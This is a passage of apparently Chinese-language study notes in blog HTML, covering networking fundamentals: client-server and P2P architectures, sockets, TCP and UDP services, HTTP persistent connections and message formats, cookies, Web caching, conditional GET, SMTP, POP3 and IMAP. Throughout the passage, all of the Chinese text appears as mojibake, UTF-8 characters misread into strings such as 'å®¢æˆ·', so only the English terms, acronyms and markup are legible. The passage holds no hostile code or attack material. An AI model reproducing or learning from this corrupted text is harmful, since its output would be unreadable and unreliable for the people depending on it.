å®¢æˆ·ä¹‹é—´ä¸ç›´æ¥é€šä¿¡.</p><p>P2P ä½“ç³»ç»“æ„ (P2P architecture), å¯¹ä½äºæ•°æ®ä¸­å¿ƒçš„ä¸“ç”¨æœåŠ¡å™¨æœ‰æœ€å°çš„ä¾èµ–. åº”ç”¨ç¨‹åºåœ¨ä¸»æœºé—´ç›´æ¥é€šä¿¡ï¼Œè¿™äº›ä¸»æœºç§°ä¸ºå¯¹ç­‰æ–¹.</p><p>æœ‰äº›åº”ç”¨å…·æœ‰æ··åˆçš„ä½“ç³»ç»“æ„.</p><h3 id="2-1-2-è¿›ç¨‹é€šä¿¡"><a href="#2-1-2-è¿›ç¨‹é€šä¿¡" class="headerlink" title="2.1.2 è¿›ç¨‹é€šä¿¡"></a>2.1.2 è¿›ç¨‹é€šä¿¡</h3><p>åœ¨ä¸¤ä¸ªä¸åŒç«¯ç³»ç»Ÿä¸Šçš„è¿›ç¨‹ï¼Œé€šè¿‡è·¨è¶Šè®¡ç®—æœºç½‘ç»œäº¤æ¢æŠ¥æ–‡ (message) è€Œç›¸äº’é€šä¿¡.</p><h4 id="1-å®¢æˆ·å’ŒæœåŠ¡å™¨è¿›ç¨‹"><a href="#1-å®¢æˆ·å’ŒæœåŠ¡å™¨è¿›ç¨‹" class="headerlink" title="1. å®¢æˆ·å’ŒæœåŠ¡å™¨è¿›ç¨‹"></a>1. å®¢æˆ·å’ŒæœåŠ¡å™¨è¿›ç¨‹</h4><p>å¯¹æ¯å¯¹é€šä¿¡è¿›ç¨‹, æˆ‘ä»¬é€šå¸¸å°†è¿™ä¸¤ä¸ªè¿›ç¨‹ä¹‹ä¸€æ ‡è¯†ä¸ºå®¢æˆ· (client), è€Œå¦ä¸€ä¸ªè¿›ç¨‹æ ‡è¯†ä¸ºæœåŠ¡å™¨ (server).</p><p>åœ¨ P2P æ–‡ä»¶å…±äº«çš„æŸäº›åº”ç”¨ä¸­ï¼Œä¸€ä¸ªè¿›ç¨‹å³æ˜¯å®¢æˆ·åˆæ˜¯æœåŠ¡å™¨.</p><p>æˆ‘ä»¬å®šä¹‰å®¢æˆ·å’ŒæœåŠ¡å™¨è¿›ç¨‹å¦‚ä¸‹:</p><blockquote><p>åœ¨ä¸€å¯¹è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ä¼šè¯åœºæ™¯ä¸­, å‘èµ·é€šä¿¡çš„è¿›ç¨‹è¢«æ ‡è¯†ä¸ºå®¢æˆ·ï¼Œåœ¨ä¼šè¯å¼€å§‹æ—¶ç­‰å¾…è”ç³»çš„è¿›ç¨‹æ˜¯æœåŠ¡å™¨.</p></blockquote><h4 id="2-è¿›ç¨‹ä¸è®¡ç®—æœºç½‘ç»œä¹‹é—´çš„æ¥å£"><a href="#2-è¿›ç¨‹ä¸è®¡ç®—æœºç½‘ç»œä¹‹é—´çš„æ¥å£" class="headerlink" title="2. è¿›ç¨‹ä¸è®¡ç®—æœºç½‘ç»œä¹‹é—´çš„æ¥å£"></a>2. è¿›ç¨‹ä¸è®¡ç®—æœºç½‘ç»œä¹‹é—´çš„æ¥å£</h4><p>è¿›ç¨‹é€šè¿‡ä¸€ä¸ªç§°ä¸ºå¥—æ¥å­— (socket) çš„è½¯ä»¶æ¥å£å‘ç½‘ç»œå‘é€æŠ¥æ–‡å’Œä»ç½‘ç»œæ¥æ”¶æŠ¥æ–‡.</p><p>å¥—æ¥å­—æ˜¯åº”ç”¨å±‚ä¸ä¼ è¾“å±‚ä¹‹é—´çš„æ¥å£.</p><p>ç”±äºè¯¥å¥—æ¥å­—æ˜¯å»ºç«‹ç½‘ç»œåº”ç”¨ç¨‹åºçš„å¯ç¼–ç¨‹æ¥å£, å› æ­¤å¥—æ¥å­—ä¹Ÿç§°ä¸ºåº”ç”¨ç¨‹åºå’Œç½‘ç»œä¹‹é—´çš„åº”ç”¨ç¨‹åºæ¥å£ (Application Programming Interface, API).</p><p>åº”ç”¨ç¨‹åºå¼€å‘è€…å¯ä»¥æ§åˆ¶å¥—æ¥å­—åœ¨åº”ç”¨å±‚ç«¯çš„ä¸€åˆ‡ï¼Œä½†æ˜¯å¯¹è¯¥å¥—æ¥å­—çš„è¿è¾“å±‚ç«¯å‡ ä¹æ²¡æœ‰æ§åˆ¶æƒ.</p><h4 id="3-è¿›ç¨‹å¯»å€"><a href="#3-è¿›ç¨‹å¯»å€" class="headerlink" title="3. è¿›ç¨‹å¯»å€"></a>3. è¿›ç¨‹å¯»å€</h4><p>éœ€å®šä¹‰ä¸¤ç§ä¿¡æ¯:</p><ul><li>ä¸»æœºçš„åœ°å€, ç”± IP åœ°å€æ ‡è¯†</li><li>åœ¨ç›®çš„ä¸»æœºä¸­æŒ‡å®šæ¥æ”¶è¿›ç¨‹çš„æ ‡è¯†ç¬¦, ç”±ç›®çš„ç«¯å£å·æ ‡è¯†</li></ul><p>æ‰€æœ‰å› ç‰¹ç½‘æ ‡å‡†åè®®çš„å‘¨çŸ¥ç«¯å£å·çš„åˆ—è¡¨èƒ½å¤Ÿåœ¨ <a href="http://www.iana.org/">è¿™ä¸ªç½‘å€</a> æ‰¾åˆ°.</p><h3 id="2-1-3-å¯ä¾›åº”ç”¨ç¨‹åºä½¿ç”¨çš„è¿è¾“æœåŠ¡"><a href="#2-1-3-å¯ä¾›åº”ç”¨ç¨‹åºä½¿ç”¨çš„è¿è¾“æœåŠ¡" class="headerlink" title="2.1.3 å¯ä¾›åº”ç”¨ç¨‹åºä½¿ç”¨çš„è¿è¾“æœåŠ¡"></a>2.1.3 å¯ä¾›åº”ç”¨ç¨‹åºä½¿ç”¨çš„è¿è¾“æœåŠ¡</h3><h4 id="1-å¯é æ•°æ®ä¼ è¾“-reliable-data-transfer"><a href="#1-å¯é æ•°æ®ä¼ è¾“-reliable-data-transfer" class="headerlink" title="1. å¯é æ•°æ®ä¼ è¾“ (reliable data transfer)"></a>1. å¯é æ•°æ®ä¼ è¾“ (reliable data transfer)</h4><h4 id="2-ååé‡"><a href="#2-ååé‡" class="headerlink" title="2. ååé‡"></a>2. ååé‡</h4><p>å…·æœ‰ååé‡è¦æ±‚çš„åº”ç”¨ç¨‹åºè¢«ç§°ä¸ºå¸¦å®½æ•æ„Ÿçš„åº”ç”¨ (bandwidth-sensitive application), å…¶å…·æœ‰ç‰¹å®šçš„ååé‡è¦æ±‚.</p><p>å¼¹æ€§åº”ç”¨ (elastic application), èƒ½å¤Ÿæ ¹æ®å½“æ—¶å¯ç”¨çš„å®½å¸¦æˆ–å¤šæˆ–å°‘åœ°åˆ©ç”¨å¯ä¾›ä½¿ç”¨çš„ååé‡.</p><h4 id="3-å®šæ—¶"><a href="#3-å®šæ—¶" class="headerlink" title="3. å®šæ—¶"></a>3. å®šæ—¶</h4><h4 id="4-å®‰å…¨æ€§"><a href="#4-å®‰å…¨æ€§" class="headerlink" title="4. å®‰å…¨æ€§"></a>4. å®‰å…¨æ€§</h4><h3 id="2-1-4-å› ç‰¹ç½‘æä¾›çš„è¿è¾“æœåŠ¡"><a href="#2-1-4-å› ç‰¹ç½‘æä¾›çš„è¿è¾“æœåŠ¡" class="headerlink" title="2.1.4 å› ç‰¹ç½‘æä¾›çš„è¿è¾“æœåŠ¡"></a>2.1.4 å› ç‰¹ç½‘æä¾›çš„è¿è¾“æœåŠ¡</h3><p>æä¾›äº† TCP å’Œ UDP.</p><h4 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h4><p>é¢å‘è¿æ¥æœåŠ¡å’Œå¯é æ•°æ®ä¼ è¾“æœåŠ¡.</p><p>TCP è¿æ¥æ˜¯å…¨åŒå·¥çš„.</p><p>å…·æœ‰æ‹¥å¡æ§åˆ¶æœºåˆ¶.</p><p><mark>æ— è®ºæ˜¯ TCP è¿˜æ˜¯ UDP éƒ½æ²¡æœ‰æä¾›ä»»ä½•åŠ å¯†æœºåˆ¶</mark> </p><p>SSL (Secure Sockets Layer) æ˜¯ TCP çš„åŠ å¼ºç‰ˆæœ¬, ä½†è¿™ç§åŠ å¼ºæ˜¯åœ¨åº”ç”¨å±‚ä¸Š.</p><p>SSL åŠ å¯†æ•°æ®å¹¶å°†åŠ å¯†çš„æ•°æ®ä¼ é€’ç»™ TCP å¥—æ¥å­—.</p><h4 id="2-UDP-æœåŠ¡"><a href="#2-UDP-æœåŠ¡" class="headerlink" title="2. UDP æœåŠ¡"></a>2. UDP æœåŠ¡</h4><p>ä¸€ç§ä¸æä¾›ä¸å¿…è¦æœåŠ¡çš„è½»é‡çº§è¿è¾“åè®®.</p><p>æ— è¿æ¥ï¼Œä¸å¯é çš„æ•°æ®ä¼ è¾“æœåŠ¡.</p><p>UDP æ²¡æœ‰åŒ…æ‹¬æ‹¥å¡æ§åˆ¶æœºåˆ¶ï¼ŒUDP çš„å‘é€ç«¯å¯ä»¥ç”¨å®ƒé€‰å®šçš„ä»»ä½•é€Ÿç‡å‘å…¶ä¸‹å±‚ (ç½‘ç»œå±‚) æ³¨å…¥æ•°æ®.</p><h4 id="3-å› ç‰¹ç½‘è¿è¾“åè®®æ‰€ä¸æä¾›çš„æœåŠ¡"><a href="#3-å› ç‰¹ç½‘è¿è¾“åè®®æ‰€ä¸æä¾›çš„æœåŠ¡" class="headerlink" title="3. å› ç‰¹ç½‘è¿è¾“åè®®æ‰€ä¸æä¾›çš„æœåŠ¡"></a>3. å› ç‰¹ç½‘è¿è¾“åè®®æ‰€ä¸æä¾›çš„æœåŠ¡</h4><p>TCP å’Œ UDP å¹¶æœªæä¾›å¯¹ååé‡å’Œå®šæ—¶ä¿è¯çš„æœåŠ¡.</p><p>è®¸å¤šé˜²ç«å¢™è¢«é…åˆ¶æˆé˜»æŒ¡ (å¤§å¤šæ•°ç±»å‹çš„) UDP æµé‡ï¼Œæ‰€ä»¥å› ç‰¹ç½‘ç”µè¯åº”ç”¨é€šå¸¸è®¾è®¡æˆå¦‚æœ UDP é€šä¿¡å¤±è´¥å°±ä½¿ç”¨ TCP ä½œä¸ºå¤‡ä»½.</p><h3 id="2-1-5-åº”ç”¨å±‚åè®®"><a href="#2-1-5-åº”ç”¨å±‚åè®®" class="headerlink" title="2.1.5 åº”ç”¨å±‚åè®®"></a>2.1.5 åº”ç”¨å±‚åè®®</h3><p>åº”ç”¨å±‚åè®® (application-layer protocol) å®šä¹‰äº†è¿è¡Œåœ¨ä¸åŒç«¯ç³»ç»Ÿä¸Šçš„åº”ç”¨ç¨‹åºè¿›ç¨‹å¦‚ä½•ç›¸äº’ä¼ é€’æŠ¥æ–‡.</p><p>åº”ç”¨å±‚åè®®å®šä¹‰äº†:</p><ul><li>äº¤æ¢çš„æŠ¥æ–‡ç±»å‹</li><li>å„ç§æŠ¥æ–‡ç±»å‹çš„è¯­æ³•</li><li>å­—æ®µçš„è¯­ä¹‰</li><li>ç¡®å®šä¸€ä¸ªè¿›ç¨‹ä½•æ—¶ä»¥åŠå¦‚ä½•å‘é€æŠ¥æ–‡</li></ul><p>åŒºåˆ†ç½‘ç»œåº”ç”¨å’Œåº”ç”¨å±‚åè®®.</p><h2 id="2-2-Web-å’Œ-HTTP"><a href="#2-2-Web-å’Œ-HTTP" class="headerlink" title="2.2 Web å’Œ HTTP"></a>2.2 Web å’Œ HTTP</h2><h3 id="2-2-1-HTTP-æ¦‚å†µ"><a href="#2-2-1-HTTP-æ¦‚å†µ" class="headerlink" title="2.2.1 HTTP æ¦‚å†µ"></a>2.2.1 HTTP æ¦‚å†µ</h3><p>HTTP ç”±ä¸¤ä¸ªç¨‹åºå®ç°:</p><ul><li>å®¢æˆ·ç¨‹åº</li><li>æœåŠ¡å™¨ç¨‹åº</li></ul><p>å¤šæ•° Web é¡µé¢åŒ…å«ä¸€ä¸ª HTML åŸºæœ¬æ–‡ä»¶ (base HTML file) ä»¥åŠå‡ ä¸ªå¼•ç”¨å¯¹è±¡.</p><p>HTML åŸºæœ¬æ–‡ä»¶é€šè¿‡å¯¹è±¡çš„ URL åœ°å€å¼•ç”¨é¡µé¢ä¸­çš„å…¶ä»–å¯¹è±¡. </p><p>HTTP å®šä¹‰äº† Web å®¢æˆ·å‘ Web æœåŠ¡å™¨è¯·æ±‚ Web é¡µé¢çš„æ–¹å¼, ä»¥åŠæœåŠ¡å™¨å‘å®¢æˆ·ä¼ é€ Web é¡µé¢çš„æ–¹å¼.</p><p>å®¢æˆ·å‘å®ƒçš„å¥—æ¥å­—æ¥å£å‘é€ HTTP è¯·æ±‚æŠ¥æ–‡å¹¶ä»å®ƒçš„å¥—æ¥å­—æ¥å£æ¥æ”¶ HTTP å“åº”æŠ¥æ–‡.</p><p>æœåŠ¡å™¨å‘å®¢æˆ·å‘é€è¢«è¯·æ±‚çš„æ–‡ä»¶ï¼Œè€Œä¸å­˜å‚¨ä»»ä½•å…³äºæ”¹å®¢æˆ·çš„çŠ¶æ€ä¿¡æ¯.</p><p>HTTP æ˜¯ä¸€ä¸ªæ— çŠ¶æ€åè®® (stateless protocol).</p><h3 id="2-2-2-éæŒç»­è¿æ¥å’ŒæŒç»­è¿æ¥-non-persistent-connection-and-persistent-connection"><a href="#2-2-2-éæŒç»­è¿æ¥å’ŒæŒç»­è¿æ¥-non-persistent-connection-and-persistent-connection" class="headerlink" title="2.2.2 éæŒç»­è¿æ¥å’ŒæŒç»­è¿æ¥ (non-persistent connection and persistent connection)"></a>2.2.2 éæŒç»­è¿æ¥å’ŒæŒç»­è¿æ¥ (non-persistent connection and persistent connection)</h3><p>HTTP æ—¢èƒ½å¤Ÿä½¿ç”¨éæŒç»­è¿æ¥ï¼Œä¹Ÿèƒ½å¤Ÿä½¿ç”¨æŒç»­è¿æ¥ã€‚</p><p>HTTP é»˜è®¤ä½¿ç”¨æŒç»­è¿æ¥.</p><p>æµè§ˆå™¨å®ç°äº† Web å®¢æˆ·ç«¯.</p><p>Web æœåŠ¡å™¨å­˜å‚¨æ–‡ä»¶.</p><p>TCP ä¸º HTTP æä¾›å¯é çš„ä¼ è¾“æœåŠ¡.</p><p>HTTP æœåŠ¡å™¨å¹¶ä¸ä¿å­˜å…³äºå®¢æˆ·çš„ä»»ä½•ä¿¡æ¯, æ‰€ä»¥è¯´ HTTP æ˜¯ä¸€ä¸ªæ— çŠ¶æ€åè®® (stateless protocal).</p><p>éæŒç»­æ€§è¿æ¥ (non-persistent connection) æ˜¯æŒ‡æ¯ä¸ªè¯·æ±‚&#x2F;å“åº”å¯¹æ˜¯ç»ä¸€ä¸ªå•ç‹¬çš„ TCP è¿æ¥å‘é€çš„.</p><p>æŒç»­è¿æ¥ (persistent connection) æ˜¯æŒ‡æ‰€æœ‰è¯·æ±‚&#x2F;å“åº”å¯¹æ˜¯ç»ç›¸åŒçš„ TCP è¿æ¥å‘é€çš„.</p><p>HTTP åœ¨å…¶é»˜è®¤çš„æ–¹å¼ä¸‹ä½¿ç”¨æŒç»­è¿æ¥.</p><p>HTTP çš„é»˜è®¤ç«¯å£æ˜¯ 80.</p><p>ä¸¤ä¸ªä¸åŒçš„æµè§ˆå™¨ä¹Ÿè®¸ä¼šä»¥ä¸åŒçš„æ–¹å¼è§£é‡ŠåŒä¸€ä¸ªé¡µé¢.</p><p>HTTP ä¸å®¢æˆ·ç¨‹åºå¦‚ä½•è§£é‡Šä¸€ä¸ª Web é¡µé¢æ¯«æ— å…³ç³».</p><p>HTTP è§„èŒƒä»…å®šä¹‰äº†åœ¨ HTTP å®¢æˆ·ç¨‹åºä¸ HTTP æœåŠ¡å™¨è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡åè®®.</p><h4 id="1-éæŒç»­æ€§è¿æ¥"><a href="#1-éæŒç»­æ€§è¿æ¥" class="headerlink" title="1. éæŒç»­æ€§è¿æ¥"></a>1. éæŒç»­æ€§è¿æ¥</h4><p>ç¼ºç‚¹, è´Ÿæ‹…å¤§.</p><p>æ¯ä¸ª TCP è¿æ¥åªä¼ è¾“ä¸€ä¸ªè¯·æ±‚æŠ¥æ–‡å’Œä¸€ä¸ªå“åº”æŠ¥æ–‡.</p><p>ä½¿ç”¨å¹¶è¡Œè¿æ¥å¯ä»¥ç¼©çŸ­å“åº”æ—¶é—´.</p><p>å¾€è¿”æ—¶é—´ (Round-Trip Time, RTT) æŒ‡ä¸€ä¸ªçŸ­åˆ†ç»„ä»å®¢æˆ·åˆ°æœåŠ¡å™¨ç„¶åå†è¿”å›å®¢æˆ·æ‰€èŠ±è´¹çš„æ—¶é—´.</p><p>ä¸‰æ¬¡æ¡æ‰‹å¤§æ¦‚:</p><ol><li>Client: æˆ‘å‘ç»™ä½ äº†</li><li>Server: æˆ‘è¿”å›äº†</li><li>Client: æˆ‘æ”¶åˆ°äº†</li></ol><h4 id="2-æŒç»­æ€§è¿æ¥"><a href="#2-æŒç»­æ€§è¿æ¥" class="headerlink" title="2. æŒç»­æ€§è¿æ¥"></a>2. æŒç»­æ€§è¿æ¥</h4><p>ä¸€èˆ¬æ¥è¯´, å¦‚æœä¸€æ¡è¿æ¥ç»è¿‡ä¸€å®šæ—¶é—´é—´éš”ä»æœªè¢«ä½¿ç”¨, HTTP æœåŠ¡å™¨å°±å…³é—­è¯¥è¿æ¥.</p><h3 id="2-2-3-HTTP-æŠ¥æ–‡æ ¼å¼"><a href="#2-2-3-HTTP-æŠ¥æ–‡æ ¼å¼" class="headerlink" title="2.2.3 HTTP æŠ¥æ–‡æ ¼å¼"></a>2.2.3 HTTP æŠ¥æ–‡æ ¼å¼</h3><h4 id="1-HTTP-è¯·æ±‚æŠ¥æ–‡"><a href="#1-HTTP-è¯·æ±‚æŠ¥æ–‡" class="headerlink" title="1. HTTP è¯·æ±‚æŠ¥æ–‡"></a>1. HTTP è¯·æ±‚æŠ¥æ–‡</h4><p>å¦‚:<br><img src="/../img/sample_http_message.png"></p><p>é€šç”¨æ ¼å¼:</p><p><img src="/../img/common_structure_of_http_message.png"></p><p>ä½¿ç”¨ GET æ–¹æ³•æ—¶å®ä½“ä½“ä¸ºç©ºï¼Œè€Œä½¿ç”¨ POST æ–¹æ³•æ˜¯æ‰ä½¿ç”¨.</p><h4 id="2-HTTP-å“åº”æŠ¥æ–‡"><a href="#2-HTTP-å“åº”æŠ¥æ–‡" class="headerlink" title="2. HTTP å“åº”æŠ¥æ–‡"></a>2. HTTP å“åº”æŠ¥æ–‡</h4><p>å¦‚:<br><img src="/../img/sample_of_replay_message.png"></p><p>é€šç”¨æ ¼å¼ï¼š</p><p><img src="/../img/common_reply_structure.png"></p><p>å¸¸è§çš„çŠ¶æ€å—å’Œç›¸å…³çš„çŸ­è¯­:</p><p><img src="/../img/common_state_num.png"></p><h3 id="2-2-4-ç”¨æˆ·ä¸æœåŠ¡å™¨çš„äº¤äº’-cookie"><a href="#2-2-4-ç”¨æˆ·ä¸æœåŠ¡å™¨çš„äº¤äº’-cookie" class="headerlink" title="2.2.4 ç”¨æˆ·ä¸æœåŠ¡å™¨çš„äº¤äº’: cookie"></a>2.2.4 ç”¨æˆ·ä¸æœåŠ¡å™¨çš„äº¤äº’: cookie</h3><p>HTTP æ˜¯æ— çŠ¶æ€çš„ä½†æ˜¯ cookie å…è®¸ç«™ç‚¹å¯¹ç”¨äºè¿›è¡Œè¿½è¸ª.</p><p>cookie æŠ€æœ¯æœ‰ 4 ä¸ªç»„ä»¶:</p><ol><li>HTTP å“åº”æŠ¥æ–‡ä¸­çš„ä¸€ä¸ª cookie é¦–éƒ¨è¡Œ</li><li>åœ¨ HTTP è¯·æ±‚æŠ¥æ–‡ä¸­çš„ä¸€ä¸ª cookie é¦–éƒ¨è¡Œ</li><li>åœ¨å®¢æˆ·ç«¯ç³»ç»Ÿä¸­ä¿å­˜æœ‰ä¸€ä¸ª cookie æ–‡ä»¶ï¼Œå¹¶æœ‰ç”¨æˆ·çš„æµè§ˆå™¨è¿›è¡Œç®¡ç†</li><li>ä½äº Web ç«™ç‚¹çš„ä¸€ä¸ªåç«¯æ•°æ®åº“</li></ol><p>å…·ä½“æµç¨‹:</p><p><img src="/../img/cookie_work_flow.png"></p><p>cookie å¯ä»¥ç”¨äºæ ‡è¯†ä¸€ä¸ªç”¨æˆ·ã€‚ç”¨æˆ·é¦–æ¬¡è®¿é—®ä¸€ä¸ªç«™ç‚¹æ—¶ï¼Œå¯èƒ½éœ€è¦æä¾›ä¸€ä¸ªç”¨æˆ·æ ‡è¯†.</p><h3 id="2-2-5-Web-ç¼“å­˜"><a href="#2-2-5-Web-ç¼“å­˜" class="headerlink" title="2.2.5 Web ç¼“å­˜"></a>2.2.5 Web ç¼“å­˜</h3><p>Web ç¼“å­˜å™¨ (Web cache) ä¹Ÿå«ä»£ç†æœåŠ¡å™¨ (proxy server)</p><p>Web ç¼“å­˜å™¨æœ‰è‡ªå·±çš„ç£ç›˜å­˜å‚¨ç©ºé—´ï¼Œå¹¶åœ¨å­˜å‚¨ç©ºé—´ä¸­ä¿å­˜æœ€è¿‘è¯·æ±‚è¿‡çš„å¯¹è±¡å‰¯æœ¬.</p><p><img src="/../img/web_cache_working_flow.png"></p><p>Web ç¼“å­˜å™¨æ—¢æ˜¯æœåŠ¡å™¨åˆæ˜¯å®¢æˆ·.</p><p>å…¶ä¸­ä¸€ä¸ªæ­¥éª¤: å¦‚æœ Web ç¼“å­˜å™¨ä¸­æ²¡æœ‰è¯¥å¯¹è±¡ï¼Œå®ƒå°±æ‰“å¼€ä¸€ä¸ªä¸è¯¥å¯¹è±¡çš„åˆå§‹æœåŠ¡å™¨çš„ TCP è¿æ¥ï¼ŒWeb ç¼“å­˜å™¨åˆ°æœåŠ¡å™¨çš„ TCP è¿æ¥ä¸Šå‘é€ä¸€ä¸ªä¸è¯¥å¯¹è±¡çš„ HTTP è¯·æ±‚ï¼Œåœ¨å—åˆ°è¯·æ±‚åï¼Œåˆå§‹æœåŠ¡å™¨å‘è¯¥ Web æœåŠ¡å™¨å‘é€å…·æœ‰è¯¥å¯¹è±¡çš„ HTTP å“åº”.</p><p>è¯·æ±‚ä» Web ç¼“å­˜å™¨ä¸Šå“åº”ï¼Œå¯ä»¥é™ä½æµå‘ä»£ç†æœåŠ¡å™¨çš„è¯·æ±‚ï¼Œå‡å°æµé‡å¼ºåº¦.</p><h3 id="2-2-6-æ¡ä»¶-GET-æ–¹æ³•"><a href="#2-2-6-æ¡ä»¶-GET-æ–¹æ³•" class="headerlink" title="2.2.6 æ¡ä»¶ GET æ–¹æ³•"></a>2.2.6 æ¡ä»¶ GET æ–¹æ³•</h3><p>åŒ…å« <code>if-Modified-Since:</code> é¦–éƒ¨è¡Œ.</p><p>ç”±ç¼“å­˜å™¨å‘å‡º.</p><p>å…¶å‘Šè¯‰æœåŠ¡å™¨ï¼Œä»…å½“è‡ªæŒ‡å®šæ—¥æœŸä¹‹åè¯¥å¯¹è±¡è¢«ä¿®æ”¹è¿‡ï¼Œæ‰å‘é€è¯¥å¯¹è±¡.</p><h3 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h3><p>ä½äº TCP&#x2F;IP å‚è€ƒæ¨¡å‹çš„åº”ç”¨å±‚.</p><h2 id="2-3-å› ç‰¹ç½‘ä¸­çš„ç”µå­é‚®ä»¶"><a href="#2-3-å› ç‰¹ç½‘ä¸­çš„ç”µå­é‚®ä»¶" class="headerlink" title="2.3 å› ç‰¹ç½‘ä¸­çš„ç”µå­é‚®ä»¶"></a>2.3 å› ç‰¹ç½‘ä¸­çš„ç”µå­é‚®ä»¶</h2><p>å› ç‰¹ç½‘ç”µå­é‚®ä»¶ç³»ç»Ÿæœ‰ä¸‰ä¸ªä¸»è¦ç»„æˆéƒ¨åˆ†:</p><ul><li>ç”¨æˆ·ä»£ç† (user agent), å¦‚ Outlook</li><li>é‚®ä»¶æœåŠ¡å™¨ (mail server) </li><li>ç®€å•é‚®ä»¶ä¼ è¾“ (Simple Mail Transfer Protocol, SMTP)</li></ul><p>ç”¨æˆ·ä»£ç†å…è®¸ç”¨æˆ·é˜…è¯», å›å¤, è½¬å‘, ä¿å­˜å’Œæ’°å†™æŠ¥æ–‡.</p><p>é‚®ç®±ä½äºé‚®ä»¶æœåŠ¡å™¨ä¸­.<br><img src="/../img/mail_structure.png"><br>SMTP ç”¨ TCP ä¼ è¾“.</p><p>SMTP åŒ…å«ä¸¤éƒ¨åˆ†:</p><ul><li>è¿è¡Œåœ¨å‘é€æ–¹é‚®ä»¶æœåŠ¡å™¨çš„å®¢æˆ·ç«¯</li><li>è¿è¡Œåœ¨æ¥æ”¶æ–¹é‚®ä»¶æœåŠ¡å™¨çš„æœåŠ¡ç«¯</li></ul><h3 id="2-3-1-SMTP"><a href="#2-3-1-SMTP" class="headerlink" title="2.3.1 SMTP"></a>2.3.1 SMTP</h3><p>å…¶é™åˆ¶æ‰€æœ‰é‚®ä»¶æŠ¥æ–‡çš„ä½“éƒ¨åˆ†åªèƒ½é‡‡ç”¨ç®€å•çš„ 7 æ¯”ç‰¹ ASCII è¡¨ç¤º.</p><p>åœ¨ä½¿ç”¨ SMTP ä¼ é€é‚®ä»¶ä¹‹å‰, éœ€è¦å°†äºŒè¿›åˆ¶å¤šåª’ä½“æ•°æ®ç¼–ç ä¸º ASCII ç , å¹¶ä¸”åœ¨ä½¿ç”¨ SMTP ä¼ è¾“åè¦æ±‚å°†ç›¸åº”çš„ ASCII ç é‚®ä»¶è§£ç è¿˜åŸä¸ºå¤šåª’ä½“æ•°æ®.</p><p>ä½¿ç”¨ HTTP ä¼ é€å‰ä¸éœ€è¦å°†å¤šåª’ä½“æ•°æ®ç¼–ç ä¸º ASCII ç .</p><p>è¿‡ç¨‹:<br><img src="/../img/transfer_mail_SMTP.png"></p><p>SMTP ä¸€èˆ¬ä¸ä½¿ç”¨ä¸­é—´é‚®ä»¶æœåŠ¡å™¨å‘é€é‚®ä»¶.</p><p>å¦‚æœ Bob çš„é‚®ä»¶æœåŠ¡å™¨æ²¡æœ‰å¼€æœº, è¯¥æŠ¥æ–‡ä¼šä¿ç•™åœ¨ Alice çš„é‚®ä»¶æœåŠ¡å™¨ä¸Šå¹¶ç­‰å¾…è¿›è¡Œæ–°çš„å°è¯•.</p><p>SMTP æ˜¯æŒç»­è¿æ¥çš„: å¦‚æœå‘é€é‚®ä»¶æœåŠ¡å™¨æœ‰å‡ ä¸ªæŠ¥æ–‡å‘å¾€åŒä¸€ä¸ªæ¥å—é‚®ä»¶æœåŠ¡å™¨, å®ƒå¯ä»¥é€šè¿‡åŒä¸€ä¸ª TCP è¿æ¥å‘é€è¿™äº›æ‰€æœ‰çš„æŠ¥æ–‡.</p><h3 id="2-3-2-ä¸-HTTP-çš„å¯¹æ¯”"><a href="#2-3-2-ä¸-HTTP-çš„å¯¹æ¯”" class="headerlink" title="2.3.2 ä¸ HTTP çš„å¯¹æ¯”"></a>2.3.2 ä¸ HTTP çš„å¯¹æ¯”</h3><p>HTTP æŠŠæ¯ä¸ªå¯¹è±¡å°è£…åˆ°å®ƒè‡ªå·±çš„ HTTP å“åº”æŠ¥æ–‡ä¸­, è€Œ SMTP åˆ™æŠŠæ‰€æœ‰æŠ¥æ–‡å¯¹è±¡æ”¾åœ¨ä¸€ä¸ªæŠ¥æ–‡ä¹‹ä¸­.</p><h3 id="2-3-3-é‚®ä»¶æŠ¥æ–‡æ ¼å¼"><a href="#2-3-3-é‚®ä»¶æŠ¥æ–‡æ ¼å¼" class="headerlink" title="2.3.3 é‚®ä»¶æŠ¥æ–‡æ ¼å¼"></a>2.3.3 é‚®ä»¶æŠ¥æ–‡æ ¼å¼</h3><p>æ¯ä¸ªé¦–éƒ¨å¿…é¡»å«æœ‰ä¸€ä¸ª <code>From: </code> é¦–éƒ¨è¡Œå’Œä¸€ä¸ª <code>To: </code> é¦–éƒ¨è¡Œ. å¯èƒ½åŒ…å«ä¸€ä¸ª <code>Subject: </code> é¦–éƒ¨è¡Œæˆ–å…¶ä»–å¯é€‰è¡Œ.</p><p>å¦‚:</p><p><img src="/../img/header_of_mail.png"></p><h3 id="2-3-4-é‚®ä»¶è®¿é—®åè®®"><a href="#2-3-4-é‚®ä»¶è®¿é—®åè®®" class="headerlink" title="2.3.4 é‚®ä»¶è®¿é—®åè®®"></a>2.3.4 é‚®ä»¶è®¿é—®åè®®</h3><p>SMTP åè®®æ˜¯ä¸€ä¸ªæ¨åè®®ï¼Œä¸èƒ½ç”¨å…¶å¾—åˆ°æŠ¥æ–‡.</p><p>ä½¿ç”¨ç¬¬ä¸‰ç‰ˆé‚®å±€åè®® (Post Office Protocol â€“ Version 3, POP3), å› ç‰¹ç½‘é‚®ä»¶è®¿é—®åè®® (Internet Mail Access Protocol, IMAP), ä»¥åŠ HTTP.</p><p><img src="/../img/send_and_get_mail.png"></p><h4 id="1-POP3"><a href="#1-POP3" class="headerlink" title="1. POP3"></a>1. POP3</h4><p>POP3 åè®®æ²¡æœ‰ç»™ç”¨æˆ·æä¾›ä»»ä½•åˆ›å»ºè¿œç¨‹æ–‡ä»¶å¤¹å¹¶ä¸ºæŠ¥æ–‡æŒ‡æ´¾æ–‡ä»¶å¤¹çš„æ–¹æ³•.</p><h4 id="2-IMAP"><a href="#2-IMAP" class="headerlink" title="2. IMAP"></a>2. IMAP</h4><p>IMAP æœåŠ¡å™¨æŠŠæ¯ä¸ªæŠ¥æ–‡ä¸ä¸€ä¸ªæ–‡ä»¶å¤¹è”ç³»èµ·æ¥ï¼Œå½“æŠ¥æ–‡ç¬¬ä¸€æ¬¡åˆ°è¾¾æœåŠ¡å™¨æ—¶ï¼Œå®ƒä¸æ”¶ä»¶äººçš„ INBOX æ–‡ä»¶å¤¹ç›¸å…³è”ã€‚</p><p>IMAP 